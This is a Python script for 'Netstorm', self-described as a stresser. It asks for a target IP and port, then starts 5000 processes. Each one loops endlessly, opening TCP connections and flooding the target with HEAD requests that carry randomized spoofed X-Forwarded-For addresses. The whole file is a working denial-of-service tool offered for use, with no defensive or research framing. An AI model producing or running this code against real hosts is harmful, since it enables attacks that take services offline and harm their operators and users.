import socket
import os
from time import sleep
import multiprocessing
import random
import platform

print("Initializing Netstorm...")
sysOS = platform.system()
print("System detected: ", sysOS)

if sysOS == "Linux":
  try:
    os.system("ulimit -n 1030000")
  except Exception as e:
    print(e)
    print("Could not start the script")
else:
  print("Netstorm Stresser has been initialized. Welcome back commander.")


def randomip():
  randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
  return randip


def attack():
  connection = "Connection: null\r\n"
  referer = "Referer: null\r\n"
  forward = "X-Forwarded-For: " + randomip() + "\r\n"
  get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
  request = get_host + referer  + connection + forward + "\r\n\r\n"
  while True:
    try:
      atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      atk.connect((ip, port))
      for y in range(80):
          atk.send(str.encode(request))
    except socket.error:
      sleep(0)
    except:
      pass

print("""\


███╗   ██╗███████╗████████╗███████╗████████╗ ██████╗ ██████╗ ███╗   ███╗
████╗  ██║██╔════╝╚══██╔══╝██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗████╗ ████║
██╔██╗ ██║█████╗     ██║   ███████╗   ██║   ██║   ██║██████╔╝██╔████╔██║
██║╚██╗██║██╔══╝     ██║   ╚════██║   ██║   ██║   ██║██╔══██╗██║╚██╔╝██║
██║ ╚████║███████╗   ██║   ███████║   ██║   ╚██████╔╝██║  ██║██║ ╚═╝ ██║
╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚══════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝
version 0.2 | https://evan.systems
                                                                        \n""")
ip = input("Target IP/Domain: ")
port = int(input("Open Port: "))
url = f"http://{str(ip)}"
print("[>>>] Netstorm: Beginning torrential thunder. [<<<]")
sleep(1)

def send2attack():
  for i in range(5000): #Magic Power
    mp = multiprocessing.Process(target=attack)
    mp.setDaemon = False
    mp.start() #Magic Starts

    
send2attack()
